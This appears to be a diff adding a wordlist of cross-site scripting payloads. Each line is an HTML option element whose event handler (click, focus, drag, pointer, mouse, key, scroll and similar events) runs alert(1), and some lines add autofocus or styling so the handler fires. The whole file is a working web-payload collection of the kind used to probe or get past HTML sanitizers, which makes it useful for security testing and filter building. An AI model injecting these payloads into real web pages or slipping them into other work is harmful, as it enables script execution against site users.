@@ -1,0 +1,38 @@
+<option contenteditable onbeforeinput=alert(1)>test
+<option draggable="true" ondrag="alert(1)" style=display:block>test</option>
+<option draggable="true" ondragend="alert(1)" style=display:block>test</option>
+<option draggable="true" ondragenter="alert(1)" style=display:block>test</option>
+<option draggable="true" ondragleave="alert(1)" style=display:block>test</option>
+<option draggable="true" ondragstart="alert(1)" style=display:block>test</option>
+<option id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></option>
+<option id=x tabindex=1 onfocus=alert(1)></option>
+<option id=x tabindex=1 onfocusin=alert(1)></option>
+<option onafterscriptexecute=alert(1)><script>1</script>
+<option onbeforescriptexecute=alert(1)><script>1</script>
+<option onblur=alert(1) id=x tabindex=1 style=display:block>test</option><input value=clickme>
+<option onclick="alert(1)" style=display:block>test</option>
+<option oncontextmenu="alert(1)" style=display:block>test</option>
+<option oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<option oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<option ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</option>
+<option onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</option><input value=clickme>
+<option onkeydown="alert(1)" contenteditable style=display:block>test</option>
+<option onkeypress="alert(1)" contenteditable style=display:block>test</option>
+<option onkeyup="alert(1)" contenteditable style=display:block>test</option>
+<option onmousedown="alert(1)" style=display:block>test</option>
+<option onmouseenter="alert(1)" style=display:block>test</option>
+<option onmouseleave="alert(1)" style=display:block>test</option>
+<option onmousemove="alert(1)" style=display:block>test</option>
+<option onmouseout="alert(1)" style=display:block>test</option>
+<option onmouseover="alert(1)" style=display:block>test</option>
+<option onmouseup="alert(1)" style=display:block>test</option>
+<option onmousewheel=alert(1) style=display:block>requires scrolling
+<option onpointerdown=alert(1) style=display:block>XSS</option>
+<option onpointerenter=alert(1) style=display:block>XSS</option>
+<option onpointerleave=alert(1) style=display:block>XSS</option>
+<option onpointermove=alert(1) style=display:block>XSS</option>
+<option onpointerout=alert(1) style=display:block>XSS</option>
+<option onpointerover=alert(1) style=display:block>XSS</option>
+<option onpointerrawupdate=alert(1) style=display:block>XSS</option>
+<option onpointerup=alert(1) style=display:block>XSS</option>
+<option onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></option>
